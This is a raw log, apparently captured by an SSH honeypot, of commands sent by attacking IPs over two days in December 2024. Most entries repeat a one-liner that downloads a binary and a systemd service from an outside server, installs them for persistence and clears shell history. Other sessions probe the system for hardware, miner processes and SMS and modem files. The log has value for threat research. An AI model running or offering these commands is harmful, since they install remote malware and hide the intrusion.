start
2024-12-10 23:37:30.456750 - ('45.148.10.203', 54506) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:37.554125 - ('45.148.10.203', 44322) - apt
2024-12-10 23:37:38.709516 - ('45.148.10.203', 44322) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:45.845783 - ('45.148.10.203', 53460) - apt
2024-12-10 23:37:47.131322 - ('45.148.10.203', 53460) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:37:54.111715 - ('45.148.10.203', 59060) - apt
2024-12-10 23:37:55.340146 - ('45.148.10.203', 59060) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:02.276068 - ('45.148.10.203', 59376) - apt
2024-12-10 23:38:03.370710 - ('45.148.10.203', 59376) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:10.320149 - ('45.148.10.203', 59568) - apt
2024-12-10 23:38:11.538300 - ('45.148.10.203', 59568) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:18.652003 - ('45.148.10.203', 59576) - apt
2024-12-10 23:38:19.936317 - ('45.148.10.203', 59576) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:27.062103 - ('45.148.10.203', 35394) - apt
2024-12-10 23:38:28.219266 - ('45.148.10.203', 35394) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:35.168249 - ('45.148.10.203', 40766) - apt
2024-12-10 23:38:36.395448 - ('45.148.10.203', 40766) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:43.333610 - ('45.148.10.203', 35582) - apt
2024-12-10 23:38:44.425474 - ('45.148.10.203', 35582) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:38:51.690588 - ('45.148.10.203', 33946) - apt
2024-12-10 23:38:52.900581 - ('45.148.10.203', 33946) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:00.044060 - ('45.148.10.203', 33962) - apt
2024-12-10 23:39:01.163276 - ('45.148.10.203', 33962) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:08.274504 - ('45.148.10.203', 56622) - apt
2024-12-10 23:39:09.424064 - ('45.148.10.203', 56622) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:16.405318 - ('45.148.10.203', 46978) - apt
2024-12-10 23:39:17.645229 - ('45.148.10.203', 46978) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:24.555579 - ('45.148.10.203', 42234) - apt
2024-12-10 23:39:25.636895 - ('45.148.10.203', 42234) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:32.803137 - ('45.148.10.203', 59260) - apt
2024-12-10 23:39:33.975293 - ('45.148.10.203', 59260) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:40.893855 - ('45.148.10.203', 40744) - apt
2024-12-10 23:39:42.106110 - ('45.148.10.203', 40744) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:49.084142 - ('45.148.10.203', 40756) - apt
2024-12-10 23:39:50.201762 - ('45.148.10.203', 40756) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:39:57.094550 - ('45.148.10.203', 56520) - apt
2024-12-10 23:39:58.301002 - ('45.148.10.203', 56520) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:40:05.495798 - ('45.148.10.203', 41006) - apt
2024-12-10 23:40:06.692616 - ('45.148.10.203', 41006) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:40:13.606635 - ('45.148.10.203', 44608) - apt
2024-12-10 23:40:14.820554 - ('45.148.10.203', 44608) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-10 23:40:21.778350 - ('45.148.10.203', 54432) - apt
2024-12-10 23:40:22.882868 - ('45.148.10.203', 54432) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:08:21.324804 - ('195.178.110.6', 34358) - apt
2024-12-11 00:08:22.419251 - ('195.178.110.6', 34358) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:26:22.312273 - ('45.148.10.46', 44798) - apt
2024-12-11 00:26:23.889543 - ('45.148.10.46', 44798) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:26:36.039374 - ('45.148.10.46', 53572) - apt
2024-12-11 00:26:37.295866 - ('45.148.10.46', 53572) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:26:51.485452 - ('45.148.10.46', 57040) - apt
2024-12-11 00:26:52.511478 - ('45.148.10.46', 57040) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:27:09.732778 - ('45.148.10.46', 40088) - apt
2024-12-11 00:27:12.096093 - ('45.148.10.46', 40088) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:27:24.990683 - ('45.148.10.46', 57512) - apt
2024-12-11 00:27:26.293105 - ('45.148.10.46', 57512) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:27:39.583830 - ('45.148.10.46', 38696) - apt
2024-12-11 00:27:40.693822 - ('45.148.10.46', 38696) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:27:54.985748 - ('45.148.10.46', 60432) - apt
2024-12-11 00:27:56.684732 - ('45.148.10.46', 60432) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:28:10.883978 - ('45.148.10.46', 44184) - apt
2024-12-11 00:28:11.834407 - ('45.148.10.46', 44184) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 00:59:59.701294 - ('122.33.127.98', 38876) - /ip cloud print
2024-12-11 01:00:00.733583 - ('122.33.127.98', 38876) - ifconfig
2024-12-11 01:00:01.574440 - ('122.33.127.98', 38876) - uname -a
2024-12-11 01:00:02.414263 - ('122.33.127.98', 38876) - cat /proc/cpuinfo
2024-12-11 01:00:03.253995 - ('122.33.127.98', 38876) - ps | grep '[Mm]iner'
2024-12-11 01:00:04.093974 - ('122.33.127.98', 38876) - ps -ef | grep '[Mm]iner'
2024-12-11 01:00:04.933921 - ('122.33.127.98', 38876) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 01:00:05.774223 - ('122.33.127.98', 38876) - echo Hi | cat -n
2024-12-11 02:58:24.471268 - ('115.141.159.195', 56044) - /ip cloud print
2024-12-11 02:58:25.550909 - ('115.141.159.195', 56044) - ifconfig
2024-12-11 02:58:26.427210 - ('115.141.159.195', 56044) - uname -a
2024-12-11 02:58:27.306234 - ('115.141.159.195', 56044) - cat /proc/cpuinfo
2024-12-11 02:58:28.191241 - ('115.141.159.195', 56044) - ps | grep '[Mm]iner'
2024-12-11 02:58:29.058221 - ('115.141.159.195', 56044) - ps -ef | grep '[Mm]iner'
2024-12-11 02:58:29.935178 - ('115.141.159.195', 56044) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 02:58:30.810314 - ('115.141.159.195', 56044) - echo Hi | cat -n
2024-12-11 03:46:27.954913 - ('124.52.110.136', 57993) - /ip cloud print
2024-12-11 03:46:29.030965 - ('124.52.110.136', 57993) - ifconfig
2024-12-11 03:46:29.870859 - ('124.52.110.136', 57993) - uname -a
2024-12-11 03:46:30.742838 - ('124.52.110.136', 57993) - cat /proc/cpuinfo
2024-12-11 03:46:31.583070 - ('124.52.110.136', 57993) - ps | grep '[Mm]iner'
2024-12-11 03:46:32.422782 - ('124.52.110.136', 57993) - ps -ef | grep '[Mm]iner'
2024-12-11 03:46:33.263029 - ('124.52.110.136', 57993) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 03:46:34.102767 - ('124.52.110.136', 57993) - echo Hi | cat -n
2024-12-11 05:03:29.271386 - ('61.39.183.74', 32990) - /ip cloud print
2024-12-11 05:03:30.995445 - ('61.39.183.74', 32990) - ifconfig
2024-12-11 05:03:32.319426 - ('61.39.183.74', 32990) - uname -a
2024-12-11 05:03:33.647358 - ('61.39.183.74', 32990) - cat /proc/cpuinfo
2024-12-11 05:03:34.975529 - ('61.39.183.74', 32990) - ps | grep '[Mm]iner'
2024-12-11 05:03:36.299331 - ('61.39.183.74', 32990) - ps -ef | grep '[Mm]iner'
2024-12-11 05:03:37.623504 - ('61.39.183.74', 32990) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 05:03:38.947342 - ('61.39.183.74', 32990) - echo Hi | cat -n
2024-12-11 05:09:19.731355 - ('115.141.223.84', 59614) - /ip cloud print
2024-12-11 05:09:20.787444 - ('115.141.223.84', 59614) - ifconfig
2024-12-11 05:09:21.647389 - ('115.141.223.84', 59614) - uname -a
2024-12-11 05:09:22.507246 - ('115.141.223.84', 59614) - cat /proc/cpuinfo
2024-12-11 05:09:23.367266 - ('115.141.223.84', 59614) - ps | grep '[Mm]iner'
2024-12-11 05:09:24.227196 - ('115.141.223.84', 59614) - ps -ef | grep '[Mm]iner'
2024-12-11 05:09:25.087243 - ('115.141.223.84', 59614) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 05:09:25.947179 - ('115.141.223.84', 59614) - echo Hi | cat -n
2024-12-11 05:15:06.771883 - ('115.141.159.195', 40640) - /ip cloud print
2024-12-11 05:15:07.834595 - ('115.141.159.195', 40640) - ifconfig
2024-12-11 05:15:08.699280 - ('115.141.159.195', 40640) - uname -a
2024-12-11 05:15:09.562850 - ('115.141.159.195', 40640) - cat /proc/cpuinfo
2024-12-11 05:15:10.423904 - ('115.141.159.195', 40640) - ps | grep '[Mm]iner'
2024-12-11 05:15:11.292045 - ('115.141.159.195', 40640) - ps -ef | grep '[Mm]iner'
2024-12-11 05:15:12.162117 - ('115.141.159.195', 40640) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-12-11 05:15:13.022151 - ('115.141.159.195', 40640) - echo Hi | cat -n
2024-12-11 05:36:54.168286 - ('45.148.10.46', 47202) - apt
2024-12-11 05:36:56.859279 - ('45.148.10.46', 47202) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 05:37:12.923982 - ('45.148.10.46', 37104) - apt
2024-12-11 05:37:14.349183 - ('45.148.10.46', 37104) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 05:37:30.232025 - ('45.148.10.46', 60114) - apt
2024-12-11 05:37:31.787869 - ('45.148.10.46', 60114) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 05:37:47.336345 - ('45.148.10.46', 42660) - apt
2024-12-11 05:37:48.755364 - ('45.148.10.46', 42660) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 05:38:03.303049 - ('45.148.10.46', 57728) - apt
2024-12-11 05:38:05.830975 - ('45.148.10.46', 57728) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-11 06:34:13.977249 - ('45.148.10.203', 35210) - apt
